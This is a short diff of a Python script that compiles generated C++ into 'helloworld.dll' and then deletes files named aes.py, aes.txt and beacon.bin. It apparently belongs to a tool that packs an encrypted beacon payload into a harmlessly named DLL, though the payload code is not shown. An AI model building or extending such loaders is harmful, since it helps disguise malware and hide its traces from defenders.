@@ -136,18 +136,12 @@ cpp_code_file = "helloworld.cpp"
 with open(cpp_code_file, "w") as file:
     file.write(cpp_code)
 
-
 # Compile 
-
 c = "x86_64-w64-mingw32-g++ -shared -o helloworld.dll helloworld.cpp -fpermissive"
 subprocess.run(c, shell=True, check=True)
-
 
 # Remove Process File
 remove = "rm -r aes.py aes.txt beacon.bin helloworld.cpp"
 subprocess.run(remove, shell=True, check=True)
-
-
-
 
 print("The helloworld.dll file has been generated.")
